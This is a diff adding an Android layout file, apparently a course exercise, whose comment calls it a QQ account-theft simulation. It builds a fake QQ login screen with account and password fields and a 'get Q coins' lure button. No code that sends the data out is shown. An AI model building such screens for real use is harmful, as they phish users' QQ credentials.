@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent">
+    <!-- QQ盗号模拟 发信息 -->
+    <!--显示QQ图片-->
+    <ImageView
+        android:id="@+id/qq"
+        android:layout_centerHorizontal="true"
+        android:paddingTop="50dp"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:src="@drawable/qq"
+        />
+    <!--QQ账号输入-->
+    <EditText
+        android:layout_marginTop="10dp"
+        android:id="@+id/day01_02_edi_zhanghao"
+        android:layout_centerHorizontal="true"
+        android:layout_below="@id/qq"
+        android:maxLength="13"
+        android:layout_width="200dp"
+        android:layout_height="50dp"
+        android:hint="请输入QQ账号"
+        android:inputType="number"/>
+    <!--QQ密码输入-->
+    <EditText
+        android:layout_marginTop="10dp"
+        android:id="@+id/da01_02_edi_mima"
+        android:layout_centerHorizontal="true"
+        android:layout_below="@id/day01_02_edi_zhanghao"
+        android:maxLength="15"
+        android:layout_width="200dp"
+        android:layout_height="50dp"
+        android:hint="请输入QQ密码"
+        android:inputType="textPassword"/>
+    <!--获取Q币按钮-->
+    <Button
+        android:layout_marginTop="10dp"
+        android:id="@+id/day01_02_but_huoqu"
+        android:layout_centerHorizontal="true"
+        android:layout_below="@id/da01_02_edi_mima"
+        android:layout_width="100dp"
+        android:layout_height="wrap_content"
+        android:text="获取Q币"/>
+
+</RelativeLayout>
